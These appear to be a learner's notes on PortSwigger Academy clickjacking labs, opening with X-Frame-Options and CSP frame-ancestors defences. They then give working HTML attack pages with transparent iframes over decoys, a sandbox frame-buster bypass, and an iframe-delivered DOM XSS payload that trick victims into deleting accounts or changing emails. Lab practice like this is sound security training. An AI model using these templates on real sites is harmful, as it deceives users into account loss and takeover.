- https://portswigger.net/web-security/clickjacking#what-is-clickjacking
- https://hacktricks.boitatech.com.br/pentesting-web/clickjacking

## Clues of clickjacking(reverse engineering)
### X-Frame-Options
X-Frame-Options was originally introduced as an unofficial response header in Internet Explorer 8 and it was rapidly adopted within other browsers. The header provides the website owner with control over the use of iframes or objects so that inclusion of a web page within a frame can be prohibited with the `deny` directive: `X-Frame-Options: deny`

Alternatively, framing can be restricted to the same origin as the website using the `sameorigin` directive: `X-Frame-Options: sameorigin` 
or to a named website using the `allow-from` directive: `X-Frame-Options: allow-from https://normal-website.com`

X-Frame-Options is not implemented consistently across browsers (the `allow-from` directive is not supported in Chrome version 76 or Safari 12 for example). However, when properly applied in conjunction with Content Security Policy as part of a multi-layer defense strategy it can provide effective protection against clickjacking attacks.

### Content Security Policy (CSP)
Content Security Policy (CSP) is a detection and prevention mechanism that provides mitigation against attacks such as XSS and clickjacking. CSP is usually implemented in the web server as a return header of the form: `Content-Security-Policy: policy`

where policy is a string of policy directives separated by semicolons. The CSP provides the client browser with information about permitted sources of web resources that the browser can apply to the detection and interception of malicious behaviors.

The recommended clickjacking protection is to incorporate the `frame-ancestors` directive in the application's Content Security Policy. The `frame-ancestors 'none'` directive is similar in behavior to the X-Frame-Options `deny` directive. The `frame-ancestors 'self'` directive is broadly equivalent to the X-Frame-Options `sameorigin` directive. The following CSP whitelists frames to the same domain only: `Content-Security-Policy: frame-ancestors 'self';`

Alternatively, framing can be restricted to named sites:
`Content-Security-Policy: frame-ancestors normal-website.com;`

## 1. Basic clickjacking with CSRF token protection
This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.

To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.

You can log in to your own account using the following credentials: `wiener:peter`

**Analysis**:
1. Log in to your account on the target website.
2. Go to the exploit server and paste the following HTML template into the **Body** section:
    ``` html
    <style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>  
    ```
3. Make the following adjustments to the template:
    - Replace `YOUR-LAB-ID` in the iframe `src` attribute with your unique lab ID.
    - Substitute suitable pixel values for the `$height_value` and `$width_value` variables of the iframe (we suggest 700px and 500px respectively).
    - Substitute suitable pixel values for the `$top_value` and `$side_value` variables of the decoy web content so that the "Delete account" button and the "Test me" decoy action align (we suggest 300px and 60px respectively).
    - Set the opacity value `$opacity` to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.
4. Click **Store** and then **View exploit**.
5. Hover over **Test me** and ensure the cursor changes to a hand indicating that the div element is positioned correctly. **Do not actually click the "Delete account" button yourself.** If you do, the lab will be broken and you will need to wait until it resets to try again (about 20 minutes). If the div does not line up properly, adjust the `top` and `left` properties of the style sheet.
6. Once you have the div element lined up correctly, change "Test me" to "Click me" and click **Store**.
7. Click on **Deliver exploit to victim** and the lab should be solved.
	![](Pasted%20image%2020241216172828.png)

## 2.   Clickjacking with form input data prefilled from a URL parameter
This lab extends the basic clickjacking example in [Lab: Basic clickjacking with CSRF token protection](https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected). The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.

To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed. 

You can log in to your own account using the following credentials: `wiener:peter`

**Analysis**:
1. Log in to the account on the target website.
2. Go to the exploit server and paste the following HTML template into the "Body" section:
   ```html 
   <style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```
3. Make the following adjustments to the template:
    - Replace `YOUR-LAB-ID` with your unique lab ID so that the URL points to the target website's user account page, which contains the "Update email" form.
    - Substitute suitable pixel values for the `$height_value` and `$width_value` variables of the iframe (we suggest 700px and 500px respectively).
    - Substitute suitable pixel values for the `$top_value` and `$side_value` variables of the decoy web content so that the "Update email" button and the "Test me" decoy action align (we suggest 400px and 80px respectively).
    - Set the opacity value `$opacity` to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.
4. Click **Store** and then **View exploit**.
5. Hover over "Test me" and ensure the cursor changes to a hand indicating that the div element is positioned correctly. If not, adjust the position of the div element by modifying the top and left properties of the style sheet.
6. Once you have the div element lined up correctly, change "Test me" to "Click me" and click **Store**.
7. Change the email address in your exploit so that it doesn't match your own.
8. Deliver the exploit to the victim to solve the lab.

- we have to trick vitctim to click on the update email buttom but with our info instead
	![](Pasted%20image%2020241216181718.png)
```html
<style>
   iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.001;
        z-index: 2;
    }

    div {
     position:absolute;
     top: 457px;
     left: 75px;
     z-index: 1;
    }
</style>

<div>Click me</div>

<iframe src="https://0a1600150327536484f84221000300b3.web-security-academy.net/my-account/?email=paein@test3.com"></iframe>
```

## 3. Clickjacking with a frame buster script
This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?

To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.

You can log in to your own account using the following credentials: `wiener:peter`

Analysis:
1. Log in to the account on the target website.
2. Go to the exploit server and paste the following HTML template into the "Body" section:
```html 
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>

<div>Test me</div>

<iframe sandbox="allow-forms"
src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```
3. Make the following adjustments to the template:
- Replace `YOUR-LAB-ID` in the iframe `src` attribute with your unique lab ID so that the URL of the target website's user account page, which contains the "Update email" form.
- Substitute suitable pixel values for the $height_value and $width_value variables of the iframe (we suggest 700px and 500px respectively).
- Substitute suitable pixel values for the $top_value and $side_value variables of the decoy web content so that the "Update email" button and the "Test me" decoy action align (we suggest 385px and 80px respectively).
- Set the opacity value `$opacity` to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.

***Note:*** Notice the use of the `sandbox="allow-forms"` attribute that neutralizes the frame buster script.
	![](Pasted%20image%2020241216184624.png)
```html
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:455px;
        left:80px;
        z-index: 1;
    }
</style>

<div>Click me</div>

<iframe sandbox="allow-forms"    src="https://0ae300b3040fe4bc80fe62ab003a00f5.web-security-academy.net/my-account?email=paein@test.com"></iframe>
```

## 4. Exploiting clickjacking vulnerability to trigger DOM-based XSS
This lab contains an XSS vulnerability that is triggered by a click. Construct a clickjacking attack that fools the user into clicking the "Click me" button to call the `print()` function.

**Analysis:**
1. Go to the exploit server and paste the following HTML template into the **Body** section:
```html
<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
	div {
		position:absolute;
		top:$top_value;
		left:$side_value;
		z-index: 1;
	}
</style>
<div>Test me</div>
<iframe
src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

2. Make the following adjustments to the template:
    - Replace `YOUR-LAB-ID` in the iframe `src` attribute with your unique lab ID so that the URL points to the target website's "Submit feedback" page.
    - Substitute suitable pixel values for the $height_value and $width_value variables of the iframe (we suggest 700px and 500px respectively).
    - Substitute suitable pixel values for the $top_value and $side_value variables of the decoy web content so that the "Submit feedback" button and the "Test me" decoy action align (we suggest 610px and 80px respectively).
    - Set the opacity value `$opacity` to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.

- accessing the submit feedback page where we can make use of XSS
![](Pasted%20image%2020241216193522.png)

![](Pasted%20image%2020241216193646.png)

- let s test the name field for XSS using a basic xss error script
	![](Pasted%20image%2020241216193901.png)  
- building our payload using  the exploit server
```html
<style>
	iframe {
		position:relative;
		width:500px;
		height: 850px;
		opacity: 0.1;
		z-index: 2;
	}
	div {
		position:absolute;
		top:790px;
		left:90px;
		z-index: 1;
	}
</style>

<div>Click me</div>

<iframe src="https://0a5f0092043d15df82eaa64900a300b3.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=paeinnn@test.com&subject=test&message=test"></iframe>
```

- we will trick the victim into performing the XSS on clicking submit form button
	![](Pasted%20image%2020241216193118.png)![](Pasted%20image%2020241216194836.png)

## 5. Multistep clickjacking
This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking. To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions. You will need to use two elements for this lab.

You can log in to the account yourself using the following credentials: `wiener:peter`

**Analysis**:
1. Log in to your account on the target website and go to the user account page.
2. Go to the exploit server and paste the following HTML template into the "Body" section:
```html
<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:$top_value1;
		left:$side_value1;
		z-index: 1;
	}
   .secondClick {
		top:$top_value2;
		left:$side_value2;
	}
</style>
<div class="firstClick">Test me first</div>
<div class="secondClick">Test me next</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```
3. Make the following adjustments to the template:
    - Replace `YOUR-LAB-ID` with your unique lab ID so that URL points to the target website's user account page.
    - Substitute suitable pixel values for the `$width_value` and `$height_value` variables of the iframe (we suggest 500px and 700px respectively).
    - Substitute suitable pixel values for the `$top_value1` and `$side_value1` variables of the decoy web content so that the "Delete account" button and the "Test me first" decoy action align (we suggest 330px and 50px respectively).
    - Substitute a suitable value for the `$top_value2` and `$side_value2` variables so that the "Test me next" decoy action aligns with the "Yes" button on the confirmation page (we suggest 285px and 225px respectively).
    - Set the opacity value `$opacity` to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.
4. Hover over "Test me first" and ensure the cursor changes to a hand indicating that the div element is positioned correctly. If not, adjust the position of the div element by modifying the top and left properties inside the `firstClick` class of the style sheet.
5. Click **Test me first** then hover over **Test me next** and ensure the cursor changes to a hand indicating that the div element is positioned correctly. If not, adjust the position of the div element by modifying the top and left properties inside the `secondClick` class of the style sheet.
6. Once you have the div element lined up correctly, change "Test me first" to "Click me first", "Test me next" to "Click me next" and click **Store** on the exploit server.

- login page
	![](Pasted%20image%2020241216205453.png)
- delete account page
	![](Pasted%20image%2020241216210309.png)
- testing exploit for the first button (delete account)
	![](Pasted%20image%2020241216210545.png)
- testing exploit for the second button (yes)
	![](Pasted%20image%2020241216210634.png)
```html
<style>
	iframe {
		position:relative;
		width:700px;
		height:600px ;
		opacity: 0.001;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:500px;
		left:50px;
		z-index: 1;
	}
   .secondClick {
		top:300px;
		left:225px;
	}
</style>

<div class="firstClick">Click me first</div>

<div class="secondClick">Click me next</div>

<iframe src="https://0af300bf0434392f820ed39f0012006a.web-security-academy.net/my-account"></iframe>
```